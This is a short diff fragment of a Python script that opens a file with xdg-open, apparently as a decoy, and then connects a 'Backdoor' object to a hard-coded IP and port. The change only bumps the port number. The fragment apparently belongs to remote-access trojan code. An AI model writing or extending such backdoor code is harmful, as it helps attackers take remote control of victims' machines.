@@ -312,7 +312,7 @@ if __name__ == "__main__":
     subprocess.Popen('xdg-open ' + file_name, shell=True)
 
     ip = '192.168.43.19'
-    port = 9876
+    port = 9877
     try:
         print(socket.gethostbyname(socket.gethostname()))
         backdoor = Backdoor(ip, port)
